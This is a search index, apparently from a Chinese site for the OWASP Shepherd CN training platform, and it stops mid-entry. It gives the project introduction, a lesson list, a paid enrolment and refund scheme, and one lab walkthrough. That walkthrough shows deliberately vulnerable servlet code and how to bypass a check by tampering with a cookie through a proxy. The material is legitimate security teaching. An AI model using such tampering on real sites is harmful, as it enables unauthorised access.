\u5bf9\u539f\u9879\u76ee\u4fee\u6539\u5982\u4e0b: \u5bf9shepherd\u672a\u6c49\u5316\u7684\u9898\u8bf4\u660e\u4fe1\u606f\uff0c\u8fdb\u884c\u6c49\u5316 \u5bf9shepherd\u7406\u89e3\u8d77\u6765\u6bd4\u8f83\u56f0\u96be\u7684\u9898,\u8fdb\u884c\u4fee\u6539,\u8ba9\u4f7f\u7528\u8005\u66f4\u52a0\u5bb9\u6613\u7406\u89e3\u9898\u610f \u4ec5\u4fdd\u7559\u4e86\u9002\u5408\u4ece\u4e8b\u6216\u5c06\u6765\u4ece\u4e8b\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u7684\u57fa\u7840web\u5b89\u5168\u77e5\u8bc6 \u9650\u5236\u65b0\u6ce8\u518c\u8d26\u53f7\u4f7f\u7528\u65f6\u95f4,\u7763\u4fc3\u53c2\u4e0e\u8005\u5c3d\u5feb\u5b8c\u6210\u5b66\u4e60\u8fc7\u7a0b \u63d0\u4f9b\u4e00\u5957\u5b8c\u6574\u7684\u5b66\u4e60\u7b14\u8bb0\u8bb0\u5f55,\u5305\u62ec\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\uff0c\u6e90\u4ee3\u7801\u89e3\u6790\uff0c\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae\u7b49 \u9879\u76ee\u5bf9\u8c61 \u00b6 \u672c\u9879\u76ee\u662f\u6700\u57fa\u672c\u7684\u5e38\u89c1web\u5b89\u5168\u6f0f\u6d1e\u5b9e\u4f8b\uff0c\u9002\u5408\u6709\u5f00\u53d1\u57fa\u7840\u7684\u4efb\u4f55\u540c\u5b66\u4f7f\u7528\uff0c\u5305\u62ec: \u5728\u804cweb\u7cfb\u7edf\u5f00\u53d1\u53ca\u6d4b\u8bd5\u540c\u5b66 \u5728\u6821\u5b66\u751f \u5bf9\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\u611f\u5174\u8da3\u7684\u4efb\u4f55\u540c\u5b66 \u9879\u76ee\u76ee\u6807 \u00b6 \u7ed3\u5408\u5177\u4f53\u5b9e\u4f8b\u7cfb\u7edf\uff0c\u5e2e\u52a9\u5f00\u53d1\u3001\u6d4b\u8bd5\u540c\u5b66\u638c\u63e1\u5e38\u89c1\u7684web\u5b89\u5168\u6f0f\u6d1e\uff0c\u63d0\u5347\u5b89\u5168\u610f\u8bc6 \u771f\u6b63\u660e\u767d\u5b89\u5168\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\u53ca\u9632\u62a4\u65b9\u6cd5 \u5c06\u5b89\u5168\u5f00\u53d1\u77e5\u8bc6\u5e94\u7528\u5230\u65e5\u5e38\u5de5\u4f5c\u4e2d,\u6253\u9020\u5b89\u5168\u7cfb\u7edf \u9879\u76ee\u6536\u76ca \u00b6 \u6df1\u523b\u7406\u89e3\"\u4e00\u5207\u7528\u6237\u7684\u8f93\u5165\u90fd\u53ef\u80fd\u662f\u6709\u5bb3\u7684\", \u5b66\u4e60\u4f7f\u7528\u4ee3\u7406\u5de5\u5177, \u4fee\u6539\u6d4f\u89c8\u5668\u53d1\u9001\u7684HTTP\u8bf7\u6c42\u5305 \u638c\u63e1\u5e38\u89c1\u7684web\u5b89\u5168\u6f0f\u6d1e(\u57fa\u672c\u6db5\u76d6\u4e86OWASP\u5341\u5927web\u5e94\u7528\u98ce\u9669)\u7684\u5371\u5bb3\u53ca\u6d4b\u8bd5\u65b9\u6cd5 \u7ed3\u5408\u793a\u4f8b\u9879\u76ee\u6e90\u4ee3\u7801,\u52a0\u6df1\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0,\u53ca\u4fee\u590d\u65b9\u6848,\u8fdb\u800c\u6253\u9020\u5b89\u5168\u7cfb\u7edf \u9879\u76ee\u8bfe\u7a0b \u00b6 \u4e3b\u8981\u4f7f\u7528 Field Training \u548c Private\u4e24\u4e2a\u7b49\u7ea7\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5217\u8868\u5982\u4e0b SQL\u6ce8\u5165(SQL Injection) SQL\u6ce8\u5165\u4e2d\u7ea7\u7248(SQL Injection Challenge One) \u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e(Cross Site Scripting) \u8de8\u7ad9\u811a\u672c\u521d\u7ea7\u7248(Cross Site Scripting 1) \u5b89\u5168\u9519\u8bef\u914d\u7f6e(Security Misconfiguration) \u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee(Failure to Restrict URL Access) \u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee\u4e2d\u7ea7\u7248(Failure To Restrict URL Access Challenge 1) \u5931\u6548\u7684\u8eab\u4efd\u9a8c\u8bc1\u548c\u4f1a\u8bdd\u7ba1\u7406\uff08Broken Authentication and Session Management) \u4f1a\u8bdd\u7ba1\u7406\u4e2d\u7ea7\u7248(Session Management Challenge One) \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020(Cross Site Request Forgery) \u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8(Insecure Cryptographic Storage) \u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8\u4e2d\u7ea7(Insecure Cryptographic Storage Challenge 1) \u4e0d\u5b89\u5168\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528(Insecure Direct Object References) \u4e0d\u4e0d\u5b89\u5168\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528\u4e2d\u7ea7\u7248(Insecure Direct Object References Challenge One) \u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1(Poor Data Validation) \u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1\u4e2d\u7ea7\u7248(Poor Validation One) \u6bcf\u4e2a\u8bfe\u7a0b\uff0c\u90fd\u6709\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u5e2e\u52a9\u53c2\u4e0e\u8005\u5b66\u4e60\u77e5\u8bc6\u70b9(\u9002\u5408\u96f6\u57fa\u7840\u540c\u5b66) \u5f53\u53c2\u4e0e\u8005\u591a\u6b21\u95ef\u5173\u5931\u8d25\uff0c\u5219\u4f1a\u663e\u793a\u63d0\u793a\u4fe1\u606f\uff0c\u8fdb\u4e00\u6b65\u5e2e\u52a9\u53c2\u4e0e\u8005\u5b66\u4e60\u548c\u7406\u89e3\u8bfe\u7a0b \u53c2\u4e0e\u9879\u76ee \u00b6 \u672c\u9879\u76ee\u662f**\u534a\u6536\u8d39**\u9879\u76ee,\u5177\u4f53\u8bf4\u660e\u5982\u4e0b: \u8bfe\u7a0b\u5f00\u59cb\u524d,\u53c2\u4e0e\u5b66\u5458\u9700\u8981\u4ea4 49.9\u5143,\u83b7\u5f97\u6ce8\u518c\u8d26\u53f7 \u5b66\u5458\u5728\u4e00\u5468\u5185\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b(\u901a\u5173), \u5219\u8868\u793a\u5b66\u6709\u6240\u6210, \u5c06**\u5168\u989d\u9000\u8d39** \u5b66\u5458\u5728\u4e8c\u5468\u5185\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b(\u901a\u5173), \u5219\u8868\u793a\u5b66\u6709\u6240\u6210, \u5c06\u9000\u8fd890%\u8d39\u7528 \u5b66\u5458\u5728\u4e09\u5468\u5185\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b(\u901a\u5173), \u5219\u8868\u793a\u5b66\u6709\u6240\u6210, \u5c06\u9000\u8fd850%\u8d39\u7528 \u5b66\u5458\u5728\u4e09\u5468\u4ee5\u540e\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b,\u5219\u4e0d\u9000\u8fd8\u4efb\u4f55\u8d39\u7528 \u4e00\u4e2a\u8d26\u53f7\u7684\u6709\u6548\u671f\u4e3a\u4e00\u4e2a\u6708,\u91cd\u65b0\u7533\u8bf7\u5219\u8ba4\u4e3a\u662f\u65b0\u6210\u5458 \u4e3a\u4ec0\u4e48\u534a\u6536\u8d39 \u6536\u8d39\u8bfe\u7a0b\u66f4\u6709\u5229\u5b66\u5458\u5b66\u4e60 \u540c\u65f6\u8003\u8651\u5230\u672c\u9879\u76ee\u5e76\u975e\u4e3a\u4e86\u76c8\u5229,\u56e0\u6b64\u672c\u9879\u76ee\u91c7\u7528\u534a\u6536\u8d39\u7684\u5f62\u5f0f \u771f\u5fc3\u7684\u5e0c\u671b\u5404\u4f4d\u53c2\u4e0e\u540c\u5b66\u771f\u6b63\u7684\u5b66\u4e60\u5230\u5b89\u5168\u77e5\u8bc6,\u5e94\u7528\u5230\u5c06\u6765\u7684\u5f00\u53d1\u9879\u76ee\u4e2d \u5982\u679c\u60a8\u662f\u5b66\u751f\u6216\u8005\u89c9\u5f97\u672c\u9879\u76ee\u53c2\u4e0e\u95e8\u69db\u8fc7\u9ad8,\u53ef\u5728\u8054\u7cfb\u5ba2\u670d\u5fae\u4fe1\u65f6\u8bf4\u660e,\u5e76\u7ed9\u51fa\u60a8\u5e0c\u671b\u7684\u8d39\u7528,\u6211\u4eec\u8ba4\u4e3a\u5b8c\u5168\u514d\u8d39\u5f88\u96be\u8fbe\u5230\u5b66\u4e60\u7684\u76ee\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u62d2\u7edd\u5b8c\u5168\u514d\u8d39\u5b66\u4e60\uff0c\u611f\u8c22\u5927\u5bb6\u7406\u89e3 \u5177\u4f53\u53c2\u52a0\u6d41\u7a0b \u8054\u7cfb\u5ba2\u670d->\u4ed8\u8d39->\u83b7\u5f97\u8d26\u53f7\u548c\u5bc6\u7801->\u767b\u5f55\u540e\u53f0\u8fdb\u884c\u5b66\u4e60->\u5b8c\u6210\u5b66\u4e60->\u8054\u7cfb\u5ba2\u670d\u9000\u8d39->\u8d26\u53f7\u5728\u4e00\u4e2a\u6708\u540e\u8fc7\u671f \u5ba2\u670d\u4f01\u4e1a\u5fae\u4fe1 \u52a0\u5ba2\u670d\u5fae\u4fe1\u65f6,\u5907\u6ce8:\u4ed8\u8d39\u5b66\u4e60 \u9879\u76ee\u652f\u6301 \u00b6 \u8be5\u9879\u76ee\u662f\u4f18\u79c0\u7684\u5b66\u4e60\u6750\u6599\uff0c\u975e\u5e38\u9002\u5408\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u8fdb\u884c\u5b66\u4e60\uff0c\u4f7f\u7528\u573a\u666f\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e \u5404\u5927\u9ad8\u6821\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u4e13\u4e1a\u540c\u5b66 \u5404\u516c\u53f8\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66 \u5982\u679c\u60a8\u662f\u8001\u5e08/\u516c\u53f8\u6280\u672f\u4eba\u5458\u60f3\u672c\u5730\u5316\u90e8\u7f72\u672c\u9879\u76ee\uff0c\u8bf7\u8054\u7cfb\u6211\u4eec \u5982\u679c\u60a8\u5bf9\u672c\u9879\u76ee\u6709\u4efb\u4f55\u5efa\u8bae\uff0c\u8bf7\u8054\u7cfb\u6211\u4eec owasp\u793e\u533a\u5728\u6301\u7eed\u7684\u66f4\u65b0\u548c\u7ef4\u62a4\uff0c\u672c\u5de5\u4f5c\u5ba4\u81f4\u529b\u4e8e\u7ef4\u62a4\u8be5\u9879\u76ee\u7684\u4e2d\u6587\u7248\u672c! \u9879\u76ee\u7f51\u5740 \u00b6 owasp shepherd cn online \u81f4\u8c22 \u00b6 \u611f\u8c22owasp shepherd \u9879\u76ee\u7ec4\uff0c\u5f00\u53d1\u548c\u7ef4\u62a4\u8be5\u5957\u5b66\u4e60\u6750\u6599 owasp shepherd github owasp shepherd project","title":"shepherd CN \u4ecb\u7ecd"},{"location":"security_qa.html#-owasp-shepherd-cn","text":"\u4f5c\u4e3a\u5f00\u53d1\u548c\u6d4b\u8bd5\u4eba\u5458,\u5982\u679c\u60f3\u6784\u5efa\u5b89\u5168\u7684\u7cfb\u7edf\uff0c\u9996\u5148\u9700\u8981\u5728\u5b9e\u9645web\u9879\u76ee\u80fd\u591f\u4e2d\u67e5\u627e\u5230\u5bf9\u5e94\u6f0f\u6d1e\uff0c\u8fdb\u4e00\u6b65\u52a0\u6df1\u5bf9\u6f0f\u6d1e\u7684\u7406\u89e3\u3002 owasp shepherd CN \u9879\u76ee\u5c31\u662f\u4e00\u5957\u96c6\u5408\u4e86\u5e38\u89c1\u5b89\u5168\u6f0f\u6d1e\u7684web\u7cfb\u7edf\uff0c\u5e0c\u671b\u7ed3\u5408\u771f\u5b9e\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u8ba9\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u63d0\u9ad8\u5b89\u5168\u610f\u8bc6\uff0c\u8fdb\u800c\u6253\u9020\u5b89\u5168\u7cfb\u7edf owasp shepherd CN \u662f\u4e00\u5957\u96c6\u6210\u4e86\u5e38\u89c1web\u6f0f\u6d1e\u7684\u7cfb\u7edf\uff0c\u6bcf\u4e2a\u9875\u9762\u662f\u5bf9\u5e94\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\uff0c\u5305\u62ec\u5b89\u5168\u6f0f\u6d1e\u7684\u4ecb\u7ecd\uff0c\u7528\u6237\u9700\u8981\u6839\u636e\u63d0\u793a\u4fe1\u606f\u5229\u7528\u6f0f\u6d1e\uff0c\u627e\u5230\u901a\u5173\u5bc6\u94a5, \u63d0\u4ea4\u5230\u7cfb\u7edf\uff0c\u5982\u679c\u63d0\u4ea4\u6b63\u786e\uff0c\u8868\u793a\u5bf9\u8be5\u6f0f\u6d1e\u5df2\u7ecf\u5b8c\u6574\u638c\u63e1\uff0c\u7136\u540e\u8fdb\u5165\u5230\u4e0b\u4e00\u4e2a\u9875\u9762/\u6f0f\u6d1e\u77e5\u8bc6\u70b9\u3002","title":"\u57fa\u7840\u5b89\u5168\u6d4b\u8bd5 - owasp shepherd CN\u9879\u76ee"},{"location":"security_qa.html#_1","text":"owasp shepherd CN \u662fowasp shepherd \u9879\u76ee\u7684\u4e2d\u6587\u7248\u672c, \u81f4\u529b\u4e8e\u5e2e\u52a9\u7814\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u63d0\u9ad8web\u5b89\u5168\u610f\u8bc6, \u5f00\u53d1\u5b89\u5168\u7684web\u7cfb\u7edf \u5bf9\u539f\u9879\u76ee\u4fee\u6539\u5982\u4e0b: \u5bf9shepherd\u672a\u6c49\u5316\u7684\u9898\u8bf4\u660e\u4fe1\u606f\uff0c\u8fdb\u884c\u6c49\u5316 \u5bf9shepherd\u7406\u89e3\u8d77\u6765\u6bd4\u8f83\u56f0\u96be\u7684\u9898,\u8fdb\u884c\u4fee\u6539,\u8ba9\u4f7f\u7528\u8005\u66f4\u52a0\u5bb9\u6613\u7406\u89e3\u9898\u610f \u4ec5\u4fdd\u7559\u4e86\u9002\u5408\u4ece\u4e8b\u6216\u5c06\u6765\u4ece\u4e8b\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u7684\u57fa\u7840web\u5b89\u5168\u77e5\u8bc6 \u9650\u5236\u65b0\u6ce8\u518c\u8d26\u53f7\u4f7f\u7528\u65f6\u95f4,\u7763\u4fc3\u53c2\u4e0e\u8005\u5c3d\u5feb\u5b8c\u6210\u5b66\u4e60\u8fc7\u7a0b \u63d0\u4f9b\u4e00\u5957\u5b8c\u6574\u7684\u5b66\u4e60\u7b14\u8bb0\u8bb0\u5f55,\u5305\u62ec\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\uff0c\u6e90\u4ee3\u7801\u89e3\u6790\uff0c\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae\u7b49","title":"\u9879\u76ee\u4ecb\u7ecd"},{"location":"security_qa.html#_2","text":"\u672c\u9879\u76ee\u662f\u6700\u57fa\u672c\u7684\u5e38\u89c1web\u5b89\u5168\u6f0f\u6d1e\u5b9e\u4f8b\uff0c\u9002\u5408\u6709\u5f00\u53d1\u57fa\u7840\u7684\u4efb\u4f55\u540c\u5b66\u4f7f\u7528\uff0c\u5305\u62ec: \u5728\u804cweb\u7cfb\u7edf\u5f00\u53d1\u53ca\u6d4b\u8bd5\u540c\u5b66 \u5728\u6821\u5b66\u751f \u5bf9\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\u611f\u5174\u8da3\u7684\u4efb\u4f55\u540c\u5b66","title":"\u9879\u76ee\u5bf9\u8c61"},{"location":"security_qa.html#_3","text":"\u7ed3\u5408\u5177\u4f53\u5b9e\u4f8b\u7cfb\u7edf\uff0c\u5e2e\u52a9\u5f00\u53d1\u3001\u6d4b\u8bd5\u540c\u5b66\u638c\u63e1\u5e38\u89c1\u7684web\u5b89\u5168\u6f0f\u6d1e\uff0c\u63d0\u5347\u5b89\u5168\u610f\u8bc6 \u771f\u6b63\u660e\u767d\u5b89\u5168\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\u53ca\u9632\u62a4\u65b9\u6cd5 \u5c06\u5b89\u5168\u5f00\u53d1\u77e5\u8bc6\u5e94\u7528\u5230\u65e5\u5e38\u5de5\u4f5c\u4e2d,\u6253\u9020\u5b89\u5168\u7cfb\u7edf","title":"\u9879\u76ee\u76ee\u6807"},{"location":"security_qa.html#_4","text":"\u6df1\u523b\u7406\u89e3\"\u4e00\u5207\u7528\u6237\u7684\u8f93\u5165\u90fd\u53ef\u80fd\u662f\u6709\u5bb3\u7684\", \u5b66\u4e60\u4f7f\u7528\u4ee3\u7406\u5de5\u5177, \u4fee\u6539\u6d4f\u89c8\u5668\u53d1\u9001\u7684HTTP\u8bf7\u6c42\u5305 \u638c\u63e1\u5e38\u89c1\u7684web\u5b89\u5168\u6f0f\u6d1e(\u57fa\u672c\u6db5\u76d6\u4e86OWASP\u5341\u5927web\u5e94\u7528\u98ce\u9669)\u7684\u5371\u5bb3\u53ca\u6d4b\u8bd5\u65b9\u6cd5 \u7ed3\u5408\u793a\u4f8b\u9879\u76ee\u6e90\u4ee3\u7801,\u52a0\u6df1\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0,\u53ca\u4fee\u590d\u65b9\u6848,\u8fdb\u800c\u6253\u9020\u5b89\u5168\u7cfb\u7edf","title":"\u9879\u76ee\u6536\u76ca"},{"location":"security_qa.html#_5","text":"\u4e3b\u8981\u4f7f\u7528 Field Training \u548c Private\u4e24\u4e2a\u7b49\u7ea7\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5217\u8868\u5982\u4e0b SQL\u6ce8\u5165(SQL Injection) SQL\u6ce8\u5165\u4e2d\u7ea7\u7248(SQL Injection Challenge One) \u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e(Cross Site Scripting) \u8de8\u7ad9\u811a\u672c\u521d\u7ea7\u7248(Cross Site Scripting 1) \u5b89\u5168\u9519\u8bef\u914d\u7f6e(Security Misconfiguration) \u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee(Failure to Restrict URL Access) \u6ca1\u6709\u9650\u5236URL\u8bbf\u95ee\u4e2d\u7ea7\u7248(Failure To Restrict URL Access Challenge 1) \u5931\u6548\u7684\u8eab\u4efd\u9a8c\u8bc1\u548c\u4f1a\u8bdd\u7ba1\u7406\uff08Broken Authentication and Session Management) \u4f1a\u8bdd\u7ba1\u7406\u4e2d\u7ea7\u7248(Session Management Challenge One) \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020(Cross Site Request Forgery) \u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8(Insecure Cryptographic Storage) \u4e0d\u5b89\u5168\u52a0\u5bc6\u5b58\u50a8\u4e2d\u7ea7(Insecure Cryptographic Storage Challenge 1) \u4e0d\u5b89\u5168\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528(Insecure Direct Object References) \u4e0d\u4e0d\u5b89\u5168\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528\u4e2d\u7ea7\u7248(Insecure Direct Object References Challenge One) \u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1(Poor Data Validation) \u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1\u4e2d\u7ea7\u7248(Poor Validation One) \u6bcf\u4e2a\u8bfe\u7a0b\uff0c\u90fd\u6709\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u5e2e\u52a9\u53c2\u4e0e\u8005\u5b66\u4e60\u77e5\u8bc6\u70b9(\u9002\u5408\u96f6\u57fa\u7840\u540c\u5b66) \u5f53\u53c2\u4e0e\u8005\u591a\u6b21\u95ef\u5173\u5931\u8d25\uff0c\u5219\u4f1a\u663e\u793a\u63d0\u793a\u4fe1\u606f\uff0c\u8fdb\u4e00\u6b65\u5e2e\u52a9\u53c2\u4e0e\u8005\u5b66\u4e60\u548c\u7406\u89e3\u8bfe\u7a0b","title":"\u9879\u76ee\u8bfe\u7a0b"},{"location":"security_qa.html#_6","text":"\u672c\u9879\u76ee\u662f**\u534a\u6536\u8d39**\u9879\u76ee,\u5177\u4f53\u8bf4\u660e\u5982\u4e0b: \u8bfe\u7a0b\u5f00\u59cb\u524d,\u53c2\u4e0e\u5b66\u5458\u9700\u8981\u4ea4 49.9\u5143,\u83b7\u5f97\u6ce8\u518c\u8d26\u53f7 \u5b66\u5458\u5728\u4e00\u5468\u5185\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b(\u901a\u5173), \u5219\u8868\u793a\u5b66\u6709\u6240\u6210, \u5c06**\u5168\u989d\u9000\u8d39** \u5b66\u5458\u5728\u4e8c\u5468\u5185\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b(\u901a\u5173), \u5219\u8868\u793a\u5b66\u6709\u6240\u6210, \u5c06\u9000\u8fd890%\u8d39\u7528 \u5b66\u5458\u5728\u4e09\u5468\u5185\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b(\u901a\u5173), \u5219\u8868\u793a\u5b66\u6709\u6240\u6210, \u5c06\u9000\u8fd850%\u8d39\u7528 \u5b66\u5458\u5728\u4e09\u5468\u4ee5\u540e\u5b8c\u6210\u6240\u6709\u8bfe\u7a0b,\u5219\u4e0d\u9000\u8fd8\u4efb\u4f55\u8d39\u7528 \u4e00\u4e2a\u8d26\u53f7\u7684\u6709\u6548\u671f\u4e3a\u4e00\u4e2a\u6708,\u91cd\u65b0\u7533\u8bf7\u5219\u8ba4\u4e3a\u662f\u65b0\u6210\u5458 \u4e3a\u4ec0\u4e48\u534a\u6536\u8d39 \u6536\u8d39\u8bfe\u7a0b\u66f4\u6709\u5229\u5b66\u5458\u5b66\u4e60 \u540c\u65f6\u8003\u8651\u5230\u672c\u9879\u76ee\u5e76\u975e\u4e3a\u4e86\u76c8\u5229,\u56e0\u6b64\u672c\u9879\u76ee\u91c7\u7528\u534a\u6536\u8d39\u7684\u5f62\u5f0f \u771f\u5fc3\u7684\u5e0c\u671b\u5404\u4f4d\u53c2\u4e0e\u540c\u5b66\u771f\u6b63\u7684\u5b66\u4e60\u5230\u5b89\u5168\u77e5\u8bc6,\u5e94\u7528\u5230\u5c06\u6765\u7684\u5f00\u53d1\u9879\u76ee\u4e2d \u5982\u679c\u60a8\u662f\u5b66\u751f\u6216\u8005\u89c9\u5f97\u672c\u9879\u76ee\u53c2\u4e0e\u95e8\u69db\u8fc7\u9ad8,\u53ef\u5728\u8054\u7cfb\u5ba2\u670d\u5fae\u4fe1\u65f6\u8bf4\u660e,\u5e76\u7ed9\u51fa\u60a8\u5e0c\u671b\u7684\u8d39\u7528,\u6211\u4eec\u8ba4\u4e3a\u5b8c\u5168\u514d\u8d39\u5f88\u96be\u8fbe\u5230\u5b66\u4e60\u7684\u76ee\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u62d2\u7edd\u5b8c\u5168\u514d\u8d39\u5b66\u4e60\uff0c\u611f\u8c22\u5927\u5bb6\u7406\u89e3 \u5177\u4f53\u53c2\u52a0\u6d41\u7a0b \u8054\u7cfb\u5ba2\u670d->\u4ed8\u8d39->\u83b7\u5f97\u8d26\u53f7\u548c\u5bc6\u7801->\u767b\u5f55\u540e\u53f0\u8fdb\u884c\u5b66\u4e60->\u5b8c\u6210\u5b66\u4e60->\u8054\u7cfb\u5ba2\u670d\u9000\u8d39->\u8d26\u53f7\u5728\u4e00\u4e2a\u6708\u540e\u8fc7\u671f \u5ba2\u670d\u4f01\u4e1a\u5fae\u4fe1 \u52a0\u5ba2\u670d\u5fae\u4fe1\u65f6,\u5907\u6ce8:\u4ed8\u8d39\u5b66\u4e60","title":"\u53c2\u4e0e\u9879\u76ee"},{"location":"security_qa.html#_7","text":"\u8be5\u9879\u76ee\u662f\u4f18\u79c0\u7684\u5b66\u4e60\u6750\u6599\uff0c\u975e\u5e38\u9002\u5408\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66\u8fdb\u884c\u5b66\u4e60\uff0c\u4f7f\u7528\u573a\u666f\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e \u5404\u5927\u9ad8\u6821\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u4e13\u4e1a\u540c\u5b66 \u5404\u516c\u53f8\u5f00\u53d1\u548c\u6d4b\u8bd5\u540c\u5b66 \u5982\u679c\u60a8\u662f\u8001\u5e08/\u516c\u53f8\u6280\u672f\u4eba\u5458\u60f3\u672c\u5730\u5316\u90e8\u7f72\u672c\u9879\u76ee\uff0c\u8bf7\u8054\u7cfb\u6211\u4eec \u5982\u679c\u60a8\u5bf9\u672c\u9879\u76ee\u6709\u4efb\u4f55\u5efa\u8bae\uff0c\u8bf7\u8054\u7cfb\u6211\u4eec owasp\u793e\u533a\u5728\u6301\u7eed\u7684\u66f4\u65b0\u548c\u7ef4\u62a4\uff0c\u672c\u5de5\u4f5c\u5ba4\u81f4\u529b\u4e8e\u7ef4\u62a4\u8be5\u9879\u76ee\u7684\u4e2d\u6587\u7248\u672c!","title":"\u9879\u76ee\u652f\u6301"},{"location":"security_qa.html#_8","text":"owasp shepherd cn online","title":"\u9879\u76ee\u7f51\u5740"},{"location":"security_qa.html#_9","text":"\u611f\u8c22owasp shepherd \u9879\u76ee\u7ec4\uff0c\u5f00\u53d1\u548c\u7ef4\u62a4\u8be5\u5957\u5b66\u4e60\u6750\u6599 owasp shepherd github owasp shepherd project","title":"\u81f4\u8c22"},{"location":"vul/Broken-Authentication-and-Session-Management.html","text":"Broken Authentication and Session Management(\u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1\u548c\u4f1a\u8bdd\u7ba1\u7406) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u672c\u9898\u4e3b\u8981\u8003\u5bdf\u4e0d\u597d\u7684\u4f1a\u8bdd\u7ba1\u7406,\u9700\u8981\u901a\u8fc7\u70b9\u51fb**\u5b8c\u6210\u8be5\u8bfe\u7a0b**\u6309\u94ae,\u6b3a\u9a97\u670d\u52a1\u5668\uff0c\u8ba9\u670d\u52a1\u5668\u8ba4\u4e3a\u6211\u4eec\u5df2\u7ecf\u5b8c\u6210\u4e86\u8be5\u8bfe\u7a0b\uff0c\u8fdb\u800c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u9875\u9762\u70b9\u51fb \u5b8c\u6210\u8be5\u8bfe\u7a0b \u6309\u94ae POST /lessons/b8c19efd1a7cc64301f239f9b9a7a32410a0808138bbefc98986030f9ea83806 HTTP/1.1 Cookie: lessonComplete=lessonNotComplete; JSESSIONID=0B5E5DB01DD31D29205ED99B77ABB56C; token=-127827516577406622538923948450307535312 \u670d\u52a1\u7aef\u4ee3\u7801: /src/main/java/servlets/module/lesson/SessionManagementLesson.java Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"lessonComplete\") == 0) { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); if(theCookie.getValue().equals(\"lessonComplete\")) { log.debug(\"Lesson Complete\"); \u529f\u80fd\u5b9e\u73b0\uff0c\u8bfb\u53d6cookie,\u5224\u65ad\u662f\u5426\u5b58\u5728cookie\u7684key\u4e3a lessonComplete\uff0c\u8fdb\u800c\u5224\u65adlessonComplete \u7684\u503c \u662f\u5426\u4e3a lessonComplete \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4f7f\u7528\u4ee3\u7406\u5de5\u5177,\u62e6\u622a\u8bf7\u6c42 \u4fee\u6539cookie\u4e2d\u7684 lessonComplete=lessonNotComplete \u4e3a lessonComplete=lessonComplete \u7ee7\u7eed\u53d1\u9001\u8bf7\u6c42 \u670d\u52a1\u5668\u8fd4\u56de\u901a\u8fc7\u5bc6\u94a5 \u603b\u7ed3 \u00b6 \u4e00\u5207\u5ba2\u6237\u7aef\u4f20\u9012\u8fc7\u6765\u7684\u6570\u636e\u90fd\u53ef\u4ee5\u88ab\u7be1\u6539\uff0c\u6240\u4ee5\u90fd\u662f\u4e0d\u53ef\u4fe1\u4efb\u7684\uff0c\u6d89\u53ca\u6838\u5fc3\u9a8c\u8bc1\uff0c\u654f\u611f\u64cd\u4f5c\uff0c\u72b6\u6001\u4fe1\u606f\u4e00\u5b9a\u8981\u4fdd\u5b58\u5230\u670d\u52a1\u7aef\u5982session\u4e2d\uff0c\u7981\u6b62\u5ba2\u6237\u7aef\u4fee\u6539","title":"Broken Authentication and Session Management(\u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1\u548c\u4f1a\u8bdd\u7ba1\u7406)"},{"location":"vul/Broken-Authentication-and-Session-Management.html#broken-authentication-and-session-management","text":"","title":"Broken Authentication and Session 